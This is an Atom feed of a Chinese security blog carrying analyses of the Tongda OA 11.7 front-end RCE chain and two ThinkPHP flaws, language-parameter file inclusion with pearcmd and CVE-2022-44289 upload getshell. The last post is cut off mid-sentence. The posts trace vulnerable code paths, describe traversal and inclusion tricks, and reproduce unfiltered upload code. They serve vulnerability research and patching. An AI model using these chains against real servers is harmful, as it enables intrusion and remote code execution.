<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>第五深雾&#39;s Blog</title>
  
  <subtitle>第五深雾&#39;s Blog</subtitle>
  <link href="https://d5shenwu.github.io/atom.xml" rel="self"/>
  
  <link href="https://d5shenwu.github.io/"/>
  <updated>2022-12-26T15:58:48.576Z</updated>
  <id>https://d5shenwu.github.io/</id>
  
  <author>
    <name>d5shenwu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>通达OA_11.7_前台RCE_分析</title>
    <link href="https://d5shenwu.github.io/2022/12/14/%E9%80%9A%E8%BE%BEOA-11-7-%E5%89%8D%E5%8F%B0RCE-%E5%88%86%E6%9E%90/"/>
    <id>https://d5shenwu.github.io/2022/12/14/%E9%80%9A%E8%BE%BEOA-11-7-%E5%89%8D%E5%8F%B0RCE-%E5%88%86%E6%9E%90/</id>
    <published>2022-12-14T12:09:33.000Z</published>
    <updated>2022-12-26T15:58:48.576Z</updated>
    
    <content type="html"><![CDATA[<p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>最近在看通达 <code>OA</code> 的相关漏洞，通达 <code>OA</code> 11.7 版本可以通过任意用户登录以及后台的几个漏洞组合 <code>getshell</code> 。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p>通达 <code>OA</code> &lt;&#x3D; 11.7</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>官网可以下到安装包：<a href="https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe">https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe</a></p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><h3 id="任意用户登录"><a href="#任意用户登录" class="headerlink" title="任意用户登录"></a>任意用户登录</h3><p>首先我们需要获取后台权限，在文件 <code>mobile/auth_mobi.php</code> </p><p><img src="image-20221214210332284.png" alt="image-20221214210332284"></p><p><code>$isAvatar</code> 与 <code>$uid</code> 等变量可以通过 <code>$_GET</code> 或 <code>$_POST</code> 等方式获取，稍微讲一下，后面都有用到</p><p>这里包含了一个 <code>inc/conn.php</code>  ，进去之后包含 <code>inc/td_config.php</code> ，继续包含 <code>inc/common.inc.php</code>  ，这里面可以看到这些变量的得到过程，篇幅问题，这里只展示 <code>$_GET</code> 部分，其余在同文件可以找到</p><p><img src="image-20221214224501852.png" alt="image-20221214224501852"></p><p>回到上面第一张图，在此处会根据 <code>$uid</code> 的值获取在线用户的 <code>SID</code> 值写入变量 <code>$P</code>，看下面的代码</p><p><img src="image-20221214211833504.png" alt="image-20221214211833504"></p><p>接下来就是使用 <code>session_id</code> 将 <code>$P</code> 写入 <code>session</code> ，这样就能成功伪造 <code>session</code></p><p>但是这里有一个缺陷，因为是根据 <code>uid</code> 去获取在线用户的 <code>sid</code> 值，那么我们伪造的用户就必须是在线的用户，因此只有在管理员在线的时候才可以使用。</p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>接下来我们就是找一处文件上传的位置，可以找到一处为 <code>general/reportshop/utils/upload.php</code> ，这个文件只有登录后才可以访问，配合上面的任意用户登录刚好可用</p><p><img src="image-20221214215736931.png" alt="image-20221214215736931"></p><p>当 <code>$action</code> 为 <code>upload</code> 时，会根据不同的 <code>$filetype</code> 处理文件，我们先随意看一个，比如第一个 <code>xls</code> 文件</p><p><img src="image-20221214220006589.png" alt="image-20221214220006589"></p><p>上传类型为 <code>xls</code> 时，首先定义一个上传路径，然后会检查文件名字与文件类型，代码如下</p><p><img src="image-20221214220123248.png" alt="image-20221214220123248"></p><p>检查文件名排除了利用文件名目录穿越的可能，检查文件类型实际上是在检查文件后缀，设置了一个黑名单，因此这里都是一些安全的过滤</p><p>回到上面，检查完之后，会进行文件的移动</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">td_move_uploaded_file($<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&quot;FILE1&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], $uploaddir . $<span class="hljs-symbol">_FILES</span>[<span class="hljs-string">&quot;FILE1&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>])<br></code></pre></td></tr></table></figure><p>两个参数，但两个参数都是不可控的，第二个参数虽然拼接了文件名，但是由于上面的文件名和文件类型检测而不可利用</p><p>我们跟进 <code>td_move_uploaded_file</code> 函数，看有没有什么可以利用的</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-keyword">inc</span>/utility_file.php<br></code></pre></td></tr></table></figure><p><img src="image-20221214220514532.png" alt="image-20221214220514532"></p><p>这里有一个 <code>is_uploadable</code> 函数，跟进看一下，还是在这个文件</p><p><img src="image-20221214220616457.png" alt="image-20221214220616457"></p><p>主要看对 <code>$FILE_NAME</code> 的处理，首先获取了后缀赋值给 <code>$EXT_NAME</code> ，然后进行判断，首先不能为空，第二是前三个字符不能为 <code>php</code>，还有一个就是不能没有点，没有点走到最后也是会返回 <code>false</code> 的</p><p>当满足上述条件时，就可以移动文件</p><h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>上述其实就是可以实现上传一个后缀不为 <code>php</code> 与 <code>exe</code>与 <code>js</code> 的文件，并且位置是固定的，位置在网站根目录的 <code>attachment</code> 的更下层，但是通达 <code>OA</code> 自身是提供了完整的服务的，包括 <code>nginx</code> 服务，其中的配置中可以找到对 <code>attachment</code> 目录的限制</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">nginx<span class="hljs-regexp">/conf/</span>nginx.conf<br></code></pre></td></tr></table></figure><p><img src="image-20221214230044660.png" alt="image-20221214230044660"></p><p>因此我们需要找到办法将上传的文件送出这个 <code>attachment</code> 文件夹</p><p>上面说到过，<code>general/reportshop/utils/upload.php</code> 可以会根据上传的类型进行判断，从而执行不同的代码，上面是对 <code>xls</code> 类型文件执行的代码进行分析，他只能将文件上传到一个固定的位置，接下来看到不是 <code>xls</code> 也不是 <code>img</code> 文件格式的处理</p><p><img src="image-20221214230757089.png" alt="image-20221214230757089"></p><p>大部分代码都和 <code>xls</code> 的处理一样，但上面框起来的部分不一样，这个 <code>$newid</code> 在上面没有定义，因此我们可以通过 <code>GET</code> 或者 <code>POST</code> 的方法传值，也就是我们可控的，<code>$new_id</code> 并没有任何的过滤，直接拼接到了 <code>$s_n</code> 上面，最后拼接到了目标文件上面，因此我们可以通过给 <code>$new_id</code> 设置 <code>../</code> 的方式进行目录穿越</p><p>因此此处我们可以实现将文件上传到任意的位置</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>上面上传的文件并不可以直接执行 <code>php</code> 文件，因此还需要一个文件包含漏洞进行利用</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ispirit<span class="hljs-regexp">/interface/g</span>ateway.php<br></code></pre></td></tr></table></figure><p>这个文件的前半部分在进行验证 <code>COOKIE</code> ，我们现在是已经可以登录，跳过这部分，直接看下面</p><p><img src="image-20221214224043213.png" alt="image-20221214224043213"></p><p>一眼就能看到包含的位置，而这个 <code>$url</code> 变量是由上面的 <code>$json</code> 解析之后得到的，<code>$json</code> 可控前面讲过了</p><p>这里的 <code>$url</code> 需要满足几个条件，一是不能包含 <code>..</code> ，相当于禁止了目录穿越，然后又限制了目录只能为如下三个中的一个</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">general/<br>ispirit/<br><span class="hljs-keyword">module</span>/<br></code></pre></td></tr></table></figure><p>由于上面有一个目录穿越的漏洞，所以我们可以将文件上传到这几个文件夹下面，从而实现文件包含</p><p>最终，通过整条链，我们就可以实现前台 <code>getshell</code>。</p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>略</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>需要注意的是，此处的登录绕过需要存在对应的用户在线，因此利用方面存在一定的局限性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。&lt;/p&gt;
&lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介</summary>
      
    
    
    
    <category term="OA漏洞复现" scheme="https://d5shenwu.github.io/categories/OA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="RCE" scheme="https://d5shenwu.github.io/tags/RCE/"/>
    
    <category term="通达OA" scheme="https://d5shenwu.github.io/tags/%E9%80%9A%E8%BE%BEOA/"/>
    
    <category term="任意用户登录" scheme="https://d5shenwu.github.io/tags/%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP_6.0.13_文件包含漏洞</title>
    <link href="https://d5shenwu.github.io/2022/12/11/ThinkPHP-6-0-13-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>https://d5shenwu.github.io/2022/12/11/ThinkPHP-6-0-13-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-12-10T16:15:44.000Z</published>
    <updated>2023-03-15T15:03:46.474Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/2059">https://forum.butian.net/share/2059</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>2022年12月出的漏洞，影响很大但目前没有 <code>CVE</code> 编号，起源是某大佬在跳跳糖发的一篇文章，<code>ThinkPHP</code> 在开启多语言的情况下，存在文件包含漏洞，配合 <code>pearcmd</code> 可以 <code>getshell</code>，大佬牛*。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>ThinkPHP5.x</code> 全版本，现已修复，修复链接： <a href="https://github.com/top-think/framework/commit/450450a1e38c5897c8d1cbd167068660632fdb27">https://github.com/top-think/framework/commit/450450a1e38c5897c8d1cbd167068660632fdb27</a></p><p><code>ThinkPHP6.0.13</code> 及之前，<code>6.0.14</code> 版本已修复</p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>本文以 <code>ThinkPHP5.1.41</code> 为例。</p><p>使用 <code>composer</code> 快速搭建 <code>thinkphp5.1.41</code> 系列最新版环境</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer</span> <span class="hljs-built_in">create-project</span> <span class="hljs-string">topthink</span>/<span class="hljs-string">think</span>=<span class="hljs-string">5</span>.<span class="hljs-string">1</span>.<span class="hljs-string">41</span> <span class="hljs-string">tp5</span>.<span class="hljs-string">1</span>.<span class="hljs-string">41</span><br></code></pre></td></tr></table></figure><p>这样安装的 <code>topthink/framework</code> 使用的是最新版已经修补了的，因此我们需要进入 <code>tp5.1.41</code> 文件夹，将 <code>composer.json</code> 中的 <code>&quot;topthink/framework&quot;: &quot;5.1.*&quot;</code> 修改为 <code>&quot;topthink/framework&quot;: &quot;5.1.41&quot;</code> ，然后执行 <code>composer update</code></p><p>此漏洞需要开启多语言功能才可以使用，在 <code>5.x</code> 系列开启的方式如下</p><p>文件 <code>config/app.php</code> 中可以设置</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-string">&#x27;lang_switch_on&#x27;</span>         =&gt; <span class="hljs-keyword">true</span>,<br></code></pre></td></tr></table></figure><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>分析部分将根据官方的修复来寻找漏洞点位，这也是常用的寻找 <code>1day</code> 的方式。</p><p>我们可以先看看官方的修复：<a href="https://github.com/top-think/framework/commit/450450a1e38c5897c8d1cbd167068660632fdb27">https://github.com/top-think/framework/commit/450450a1e38c5897c8d1cbd167068660632fdb27</a></p><p><img src="image-20221211205635382.png" alt="image-20221211205635382"></p><p>这里 <code>commit</code> 的时候就很明显地说了是改进多语言判断机制，修复的代码实际上就是在做一件事，对 <code>$langSet</code> 进行过滤。</p><p>接下来我们跟进代码进行分析，上面的代码位于 <code>thinkphp/library/think/Lang.php</code> 文件中的 <code>detect</code> 方法</p><p><img src="image-20221211211137582.png" alt="image-20221211211137582"></p><p>我们此处是存在漏洞的代码，也就是没有进行过滤的，修复代码是在 219 行对 <code>$langSet</code> 增加过滤</p><p>先看 <code>$langSet</code> 是如何得到的，有三种方式：</p><p>第一种方式，直接 <code>GET</code> 方式获取，参数名为 <code>$this-&gt;langDetectVar</code> 的值，这个值的默认定位如下</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">protected</span> $langDetectVar = <span class="hljs-string">&#x27;lang&#x27;</span>;<br></code></pre></td></tr></table></figure><p>也就是 <code>GET</code> 一个 <code>lang</code> 即可获取 <code>langSet</code></p><p>第二种方式，通过 <code>COOKIE</code> 获取，参数如上也是 <code>lang</code></p><p>第三种方式，通过 <code>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</code> ，这也是我们可以控制的，但是他存在过滤代码，因此这里我们不好利用</p><p>根据如上三种方式，那么这个 <code>$langSet</code> 是轻易可控的</p><p>看到下面的代码，判断如果 <code>$this-&gt;allowLangList</code> 是否为空，或者 <code>$langSet</code> 是否在该数组中，这里的 <code>$this-&gt;allowLangList</code> 默认是为空的，因此会进入 <code>if</code> 语句内部，这时就会将我们可控的 <code>$langSet</code> 直接赋值给 <code>$this-&gt;range</code> ，然后将其返回</p><p>通过上述代码，可知存在漏洞的版本中，这个 <code>detect</code> 方法的返回值是完全可控的，接下来我们就是去找此方法的调用位置，直接搜索即可</p><p><img src="image-20221211213441255.png" alt="image-20221211213441255"></p><p>第二条就是调用 <code>detect</code> 方法，跟进代码</p><p><img src="image-20221211213528442.png" alt="image-20221211213528442"></p><p>代码中加载了当前的配置，然后查询 <code>app.lang_switch_on</code> ，这是开启多语言机制的标志，当返回为 <code>true</code> 时即可调用到我们可控的 <code>detect</code> 方法，这时就会使得 <code>$this-&gt;lang</code> 中的 <code>range</code> 变量是可控的，跟进  465 行</p><p><code>$this-&gt;lang-&gt;range()</code> 方法</p><p><img src="image-20221211213941091.png" alt="image-20221211213941091"></p><p>返回 <code>$this-&gt;range</code> ，这个值前面说过了，完全可控，继续跟进</p><p><code>$this-&gt;request-&gt;setLangset()</code> 方法，参数是上面的可控值</p><p><img src="image-20221211215023454.png" alt="image-20221211215023454"></p><p>直接将参数 <code>$lang</code> 赋值给了 <code>$this-&gt;langset</code>，因此现在 <code>$this-&gt;langset</code> 可控</p><p>接下来回到上面的加载系统语言包</p><p><img src="image-20221211215349963.png" alt="image-20221211215349963"></p><p>看到 <code>$this-&gt;request-&gt;langset()</code></p><p><img src="image-20221211215302978.png" alt="image-20221211215302978"></p><p>直接返回 <code>$this-&gt;langset</code> ，而这个值可控，我们可以通过设置成 <code>../../xxx</code> 的形式获取到任意位置的 <code>php</code> 文件，限制了后缀，因此只能是 <code>php</code> 文件</p><p>因此 <code>$this-&gt;lang-&gt;load()</code> 方法的参数可以是任意位置的 <code>php</code> 文件组成的数组，跟进该方法看看</p><p><img src="image-20221211215700865.png" alt="image-20221211215700865"></p><p>代码很容易看懂，遍历传进来的数组，最后 <code>include</code> 该文件，因此这里我们可以实现包含任意位置的 <code>php</code> 文件</p><p>最后就是寻找 <code>loadLangPack</code> 方法调用的位置，发现在 <code>thinkphp/library/think/App.php</code> 的 <code>initialize</code> 方法中，直接被调用</p><p><img src="image-20221211230716565.png" alt="image-20221211230716565"></p><p>这个 <code>initialize</code> 方法是初始化 <code>thinkphp</code> 的应用，运行时一定会调用。</p><p>由上面的就能知道该漏洞只要在开启了多语言机制，访问任何页面都会触发。调用链如下</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">访问 -&gt; initialize<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> loadLangPack<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> $this-&gt;lang-&gt;load<span class="hljs-function"><span class="hljs-params">()</span> -&gt;</span> include file<br></code></pre></td></tr></table></figure><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>该漏洞有个最大的限制点就是被包含的文件后缀一定是 <code>php</code> ，要包含一个 <code>php</code> 文件，利用的方式就少了，但我们可以利用 <code>pearcmd</code>  ，参考链接：<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p><p>利用 <code>pearcmd</code> 需要满足条件：</p><ol><li>安装了该 <code>pear</code> 库</li><li>开启 <code>register_argc_argv</code> 配置</li></ol><p>常规的环境一般很少会安装 <code>pear</code> 库，也不会开启 <code>register_argc_argv</code> 配置，但是 <code>php</code> 的官方 <code>docker</code> 环境默认会有该库，并且 <code>register_argc_argv</code> 也会被打开，这里我开了一个使用 <code>php</code> 官方 <code>docker</code> 环境的 <code>docker</code> ，可以看到默认有 <code>pear</code></p><p><img src="image-20221212001719765.png" alt="image-20221212001719765"></p><p>此处就借助该 <code>docker</code> 进行漏洞复现，使用了官方的 <code>docker</code> ，就只需要打开多语言即可，然后就可以进行利用，<code>pearcmd</code> 的利用方法就不多讲了，可以看上面提供的链接</p><p><img src="image-20221212141847902.png" alt="image-20221212141847902"></p><p>这时候就可以看到 <code>/tmp</code> 目录下写入了一个 <code>hello.php</code> 文件</p><p><img src="image-20221212142110044.png" alt="image-20221212142110044"></p><p>其实这里也不是单纯地将 <code>&lt;?=phpinfo()?&gt;</code> 写入了，而是一个序列化后的数据，但对 <code>php</code> 执行不影响，我们再利用本文的漏洞对该 <code>/tmp/hello.php</code> 文件进行包含</p><p><img src="image-20221212142317211.png" alt="image-20221212142317211"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>总体来说，感觉这个洞的限制还是比较多的，多语言机制可能还好，开这个的估计也不在少数，但是文件包含的限制比较不好弄，因为限制了 <code>php</code> 的后缀，虽然可以通过 <code>pear</code> 来 <code>getshell</code> ，但是一般环境默认不存在，让这个洞 <code>getshell</code> 的几率大大降低了。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/2059&quot;&gt;https://forum.butian.net/share/2059&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://d5shenwu.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="ThinkPHP" scheme="https://d5shenwu.github.io/tags/ThinkPHP/"/>
    
    <category term="getshell" scheme="https://d5shenwu.github.io/tags/getshell/"/>
    
    <category term="文件包含漏洞" scheme="https://d5shenwu.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP_5.1.41_文件上传getshell_CVE-2022-44289</title>
    <link href="https://d5shenwu.github.io/2022/12/09/ThinkPHP-5-1-41-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell-CVE-2022-44289/"/>
    <id>https://d5shenwu.github.io/2022/12/09/ThinkPHP-5-1-41-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell-CVE-2022-44289/</id>
    <published>2022-12-09T15:31:36.000Z</published>
    <updated>2023-03-15T15:03:41.271Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/2058">https://forum.butian.net/share/2058</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>2022年12月出的一个 <code>CVE</code> ，漏洞作者在10月左右就写在<code>thinkphp</code> 的 <code>github</code> 下面了，链接在这：<a href="https://github.com/top-think/framework/issues/2772">https://github.com/top-think/framework/issues/2772</a> ，此漏洞属于框架函数的漏洞，需要开发者编写代码时使用到该函数才有机会利用。</p><p>在官方开发手册的示例中，使用了该函数，并且没有任何过滤，因此当开发者使用 <a href="https://www.kancloud.cn/manual/thinkphp5_1/354121">官方示例</a> 进行开发时，就可以 <code>getshell</code>。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>thinkphp 5.x</code> 系列</p><p>不影响目前的 <code>thinkphp6.x</code> </p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>使用 <code>composer</code> 快速搭建 <code>thinkphp5.x</code> 系列最新版环境</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">composer</span> <span class="hljs-built_in">create-project</span> <span class="hljs-string">topthink</span>/<span class="hljs-string">think</span>=<span class="hljs-string">5</span>.<span class="hljs-string">1</span>.* <span class="hljs-string">tp5</span>.<span class="hljs-string">1</span>.<span class="hljs-string">41</span><br></code></pre></td></tr></table></figure><p>之后根据官方示例 <a href="https://www.kancloud.cn/manual/thinkphp5_1/354121">https://www.kancloud.cn/manual/thinkphp5_1/354121</a> 编写，修改如下文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">application<span class="hljs-regexp">/index/</span>controller/Index.php<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Index</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-comment">// 获取表单上传文件 例如上传了001.jpg</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">request</span>()-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;image&#x27;</span>);<br>        <span class="hljs-comment">// 移动到框架应用根目录/uploads/ 目录下</span><br>        <span class="hljs-variable">$info</span> = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">move</span>( <span class="hljs-string">&#x27;../uploads&#x27;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$info</span>)&#123;<br>            <span class="hljs-comment">// 成功上传后 获取上传信息</span><br>            <span class="hljs-comment">// 输出 jpg</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$info</span>-&gt;<span class="hljs-title function_ invoke__">getExtension</span>();<br>            <span class="hljs-comment">// 输出 20160820/42a79759f284b767dfcb2a0197904287.jpg</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$info</span>-&gt;<span class="hljs-title function_ invoke__">getSaveName</span>();<br>            <span class="hljs-comment">// 输出 42a79759f284b767dfcb2a0197904287.jpg</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$info</span>-&gt;<span class="hljs-title function_ invoke__">getFilename</span>();<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">// 上传失败获取错误信息</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getError</span>();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>官方示例文件中注释写的很明白，就是先上传文件，然后将文件移动到根目录的 <code>uploads</code> 文件夹下，后面代码就是在输出。</p><p>我们先看第一句 <code>request()-&gt;file(&#39;image&#39;);</code></p><p><code>request()</code> 直接加载了 <code>thinkphp/library/think/Request.php</code> 中的 <code>Request</code> 类，然后访问 <code>file</code> 方法</p><p><img src="image-20221210185619775.png" alt="image-20221210185619775"></p><p>这里就是取到了 <code>$_FILES</code> 与 <code>$name</code> ，然后传入 <code>dealUploadFile</code> 方法，返回一个 <code>$array</code> ，最后会返回一个 <code>$array[$name]</code> ，我们跟进 <code>dealUploadFile</code> 方法</p><p><img src="image-20221210204622555.png" alt="image-20221210204622555"></p><p>我们传进来的 <code>$files</code> 是 <code>$_FILES</code> ，因此不满足第一个 <code>if</code> 条件，<code>$file[&#39;name&#39;]</code> 就是传入的 <code>filename</code> ，不为数组时就会进入最后的 <code>else</code> ，正常传入文件就不会出现 <code>error</code> ，因此来到 1246 行，这时候进入 <code>thinkphp/library/think/File.php</code> 的 <code>setUploadInfo</code> 方法，来到这里</p><p><img src="image-20221210204517548.png" alt="image-20221210204517548"></p><p>这里返回了 <code>$this</code> ，也就是实例化后的 <code>File</code> 类。</p><p>然后继续返回，可以看到，我们编写的文件中，第一句最后的返回就是这个实例化后的 <code>File</code> 类</p><p>看到第二句 <code>$file-&gt;move( &#39;../uploads&#39;)</code> ，调用该类的 <code>move</code> 方法，参数是 <code>../uploads</code> ，跟进该方法</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">thinkphp<span class="hljs-regexp">/library/</span>think/<span class="hljs-keyword">File</span>.php<br></code></pre></td></tr></table></figure><p><img src="image-20221210205857136.png" alt="image-20221210205857136"></p><p>这里是 <code>move</code> 方法的上半部分，代码都有注释，因此很好理解，涉及到检测的有三个方法，分别是 <code>isValid</code> 、<code>check</code> 、<code>chechPath</code> ，我们依次看看</p><p><code>isValid</code> 方法</p><p><img src="image-20221210224032960.png" alt="image-20221210224032960"></p><p>这里只是检测是不是文件或者上传的文件，显然是满足的。</p><p><code>check</code> 方法</p><p><img src="image-20221210224209801.png" alt="image-20221210224209801"></p><p>此处的参数是没有传入的，因此 <code>$rule</code> 就是空数组</p><p>第一句这里，由于 <code>$rule</code> 为空，因此会获得 <code>$this-&gt;validate</code> 的值，这个 <code>$this-&gt;validate</code> 的值是在 <code>validate</code> 方法中设置的，如下</p><p><img src="image-20221210224629725.png" alt="image-20221210224629725"></p><p>按照官方示例的代码，是没有写这个 <code>validate</code> 限制的，这里 <code>validate</code> 默认也是空数组，因此 <code>$rule</code> 的值也还是空的，其实如果要防止这个漏洞的话，也是可以利用这个 <code>validate</code> 方法进行设置的。</p><p>由于 <code>$rule</code> 为空数组，因此前面三个判断都不会生效，只会进行第四个，也就是 <code>$this-&gt;checkImg()</code>  方法，只要这个方法返回 <code>true</code> ，那么就会跳过这里的判断，我们来看到这个方法</p><p><img src="image-20221210225726871.png" alt="image-20221210225726871"></p><p>这个方法检查图片后缀以及图片类型。</p><p>首先获取后缀并转为小写，得到 